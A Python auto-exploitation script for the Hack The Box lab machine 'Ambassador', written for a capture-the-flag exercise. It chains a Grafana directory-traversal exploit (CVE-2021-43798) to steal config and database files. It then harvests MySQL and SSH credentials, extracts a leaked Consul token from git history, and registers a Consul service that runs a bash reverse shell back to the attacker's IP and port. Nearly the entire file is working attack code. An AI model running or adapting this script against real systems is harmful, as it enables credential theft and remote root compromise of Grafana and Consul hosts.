#!/usr/bin/env python3

"""
Autopwn Assambador HTB
----------------------
Author: Marss
Date: 21 Nov, 2022
"""

import argparse
import sqlite3

from base64 import b64decode
from json import dumps
from mysql import connector
from paramiko import AutoAddPolicy, SSHClient
from pwn import *
from random import choice
from re import findall
from requests import Request, Session
from signal import signal, SIGINT
from sys import exit

## Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User terminated.')

# (signal)
signal(SIGINT, signal_handler)


## Global variables
# grafana plugins
plugins = [ 
	"alertlist",
	"annolist",
	"barchart",
	"bargauge",
	"candlestick",
	"cloudwatch",
	"dashlist",
	"elasticsearch",
	"gauge",
	"geomap",
	"gettingstarted",
	"grafana-azure-monitor-datasource",
	"graph",
	"heatmap",
	"histogram",
	"influxdb",
	"jaeger",
	"logs",
	"loki",
	"mssql",
	"mysql",
	"news",
	"nodeGraph",
	"opentsdb",
	"piechart",
	"pluginlist",
	"postgres",
	"prometheus",
	"stackdriver",
	"stat",
	"state-timeline",
	"status-history",
	"table",
	"table-old",
	"tempo",
	"testdata",
	"text",
	"timeseries",
	"welcome",
	"zipkin"
]

## Main class
class Exploit:
	def __init__(self, args):
		self.args = args

		self.target_host = {
			'ip_address' : '10.10.11.183',
			'grafana_service' : 'http://10.10.11.183:3000'
		}

		self.target_files = {
			'grafana_conf' : '/etc/grafana/grafana.ini',
			'grafana_db' : None
		}

		self.target_credentials = {
			'mysql' : {
				'user' : None,
				'pass' : None
			},
			'ssh' : {
				'user' : None,
				'pass' : None
			},
			'consul' : { 'token' : None }
		}

		self.json_file = 'payload.json'
		self.shell_file = 'shell.sh'

	def run(self):
		"""
		Exploit process:
		----------------
		(1) Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)
			* Database path into Grafana config file
		
		(2) SQLite enumeration in Grafana database file
			* Mysql credentials

		(3) Mysql enumeration
			* SSH credentials

		(4) Vulnerable path in Consul service registration (Remote Code Execution)
			* [Requirements] 
				- Consul token (Leakage Information in git repository)
		"""
		with log.progress('Starting Attack') as progress:

			progress.status('Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)'); time.sleep(3)
			self.extract_file(file=self.target_files['grafana_conf'])

			progress.status('Searching grafana.db path in config file'); time.sleep(3)
			self.get_database_path()
			self.extract_file(file=self.target_files['grafana_db'])
			
			progress.status('SQLite enumeration in Grafana database file'); time.sleep(3)
			self.get_mysql_cred()
			
			progress.status('Login to Mysql with credentials'); time.sleep(2)
			self.extract_ssh_cred()

			progress.status('Prepare .json and .sh file'); time.sleep(3)
			self.prepare_files()

			progress.status('Creating Consul service to receive the shell'); time.sleep(3)
			self.get_shell()

	def extract_file(self, file):
		try:
			with Session() as session:
				vulnerable_path = self.target_host['grafana_service'] \
					+ '/public/plugins/' \
					+ choice(plugins) \
					+ '/..'*8 \
					+ file

				request = Request(method='GET', url=vulnerable_path)

				prepare_request = session.prepare_request(request)
				prepare_request.url = vulnerable_path

				response = session.send(prepare_request)

				if 'Plugin not found' in response.text:
					exit('\n[!] File not found.')
				else:
					if response.status_code == 200:
						file_name = file.split('/')[-1] # extract only file name

						with open(file_name, 'wb') as file:
							file.write(response.content)

						log.info(f'(CVE-2021-43798) Extracted file -> {file_name}'); time.sleep(1)
		
		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def get_database_path(self):
		try:
			file_name = self.target_files['grafana_conf'].split('/')[-1] # extract only file name

			with open(file_name, 'rb') as file:
				content = file.read()

				filter_data = findall(r';data = (.+)|;path = (.+)', content.decode('utf-8'))

				database_path = filter_data[0][0] + '/' + filter_data[1][1]

				self.target_files['grafana_db'] = database_path

		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def get_mysql_cred(self):
		try:
			file_name = self.target_files['grafana_db'].split('/')[-1] # extract only file name

			with sqlite3.connect(file_name) as connection:
				cursor = connection.cursor()

				query = 'SELECT user, password FROM data_source'
				response = cursor.execute(query)

				username, password = response.fetchone()

				self.target_credentials['mysql']['user'] = username
				self.target_credentials['mysql']['pass'] = password

				log.success('Mysql credentials -> {}:{}'.format(username, password)); time.sleep(1)

		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def extract_ssh_cred(self):
		try:
			connection = connector.connect(host=self.target_host['ip_address'],
										   database='whackywidget',
										   user=self.target_credentials['mysql']['user'],
										   password=self.target_credentials['mysql']['pass'])

			if connection.is_connected():
				cursor = connection.cursor()

				query = 'SELECT user, pass from users'
				cursor.execute(query)

				username, b64_password = cursor.fetchone()

				# decode base64 password
				b64_bytes = b64_password.encode('ascii')
				msg_bytes = b64decode(b64_bytes)
				password = msg_bytes.decode('ascii').replace('\n', '')

				self.target_credentials['ssh']['user'] = username
				self.target_credentials['ssh']['pass'] = password

				log.success('SSH credentials -> {}:{}'.format(username, password)); time.sleep(1)

		except Exception as error:
			exit('\n[x] Error: %s' % error)
		finally:
			if connection.is_connected():
				cursor.close()
				connection.close()

	def ssh_connection(self, user, password):
		try:
			ssh_client = SSHClient()
			ssh_client.set_missing_host_key_policy(AutoAddPolicy())
			ssh_client.connect(self.target_host['ip_address'],
							   port=22,
							   username=user,
							   password=password)

			return ssh_client

		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def get_consul_token(self, ssh_client):
		try:
			command = "cd /opt/my-app/ && git show" # path repository
			_stdin, _stdout, _stderr = ssh_client.exec_command(command)

			output = _stdout.read().decode('utf-8')
			token = findall(r'--token (.*?) ', output)[0]

			self.target_credentials['consul']['token'] = token

			log.success('Consul token -> {}'.format(token)); time.sleep(1)

		except Exception as error:
			exit('\n[x] Error %s:' % error)

	def prepare_files(self):
		# reverse shell file
		shell_data = "#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(self.args.ip, self.args.port)

		with open(self.shell_file, 'w') as file:
			file.write(shell_data)

			log.info('File created : {}'.format(self.shell_file)); time.sleep(1)

		# consul service RCE file
		json_data = {
			"ID": "autopwn_shell",
			"Name": "pwn",
			"Address": "127.0.0.1",
			"Port": 80,
			"Check": {
				"DeregisterCriticalServiceAfter": "90m",
				"Args": ["/bin/bash", f"/tmp/.{self.args.ip}/shell.sh"],
				"Interval": "10s",
				"Timeout": "86400s"
			}
		}

		json_obj = dumps(json_data, indent=4)

		with open(self.json_file, 'w') as file:
			file.write(json_obj)

			log.info('File created : {}'.format(self.json_file)); time.sleep(1)

	def upload_files(self, ssh_client):
		with ssh_client.open_sftp() as sftp_client:
			sftp_client.put(self.shell_file, '/tmp/.{}/{}'.format(self.args.ip, self.shell_file))
			sftp_client.put(self.json_file, '/tmp/.{}/{}'.format(self.args.ip, self.json_file))

			log.info('Uploaded files'); time.sleep(1)

	def get_shell(self):
		try:
			ssh_client = self.ssh_connection(user=self.target_credentials['ssh']['user'],
											 password=self.target_credentials['ssh']['pass'])

			# create workstation
			ssh_client.exec_command('mkdir -p /tmp/.{}'.format(self.args.ip))

			# get token and upload required files
			self.get_consul_token(ssh_client)
			self.upload_files(ssh_client)
			
			# create service and send root shell
			command = "curl -X PUT 'http://localhost:8500/v1/agent/service/register?replace-existing-checks=true'" \
				+ f" -H 'X-Consul-Token: {self.target_credentials['consul']['token']}'" \
				+ f" --data @/tmp/.{self.args.ip}/{self.json_file}"

			ssh_client.exec_command(command)

			# listen mode to receive shell
			shell = listen(self.args.port, timeout=20).wait_for_connection()

			if shell.sock:
				log.info('Press Ctrl + D to exit.')
				shell.interactive()

			log.info('Removing service')
			# remove service
			command = "curl -X PUT 'http://localhost:8500/v1/agent/service/deregister/autopwn_shell'" \
				+ f" -H 'X-Consul-Token: {self.target_credentials['consul']['token']}'"
			ssh_client.exec_command(command)

			log.info('Removing workstation with uploaded files')
			# remove workstation
			ssh_client.exec_command(f'rm -r /tmp/.{self.args.ip}')

			# close ssh connection
			ssh_client.close()

		except Exception as error:
			exit('\n[x] Error: %s' % error)

## Main flow
if __name__ == '__main__':
	ascii_title = '''
	 /\  ._ _  |_   _.  _  _  _.  _|  _  ._    /\      _|_  _  ._       ._  
	/--\ | | | |_) (_| _> _> (_| (_| (_) |    /--\ |_|  |_ (_) |_) \/\/ | | 
	                                                           |           
	                                                                  by marss
	'''

	parser = argparse.ArgumentParser(
		description=ascii_title,
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog='''\nExample:
		autopwn.py -i 10.10.10.10 -p 4444
		''')

	parser.add_argument('-i', '--ip', required=True, help='Specified IP to receive the shell')
	parser.add_argument('-p', '--port', required=True, help='Specified PORT to receive the shell')

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)
	exploit.run()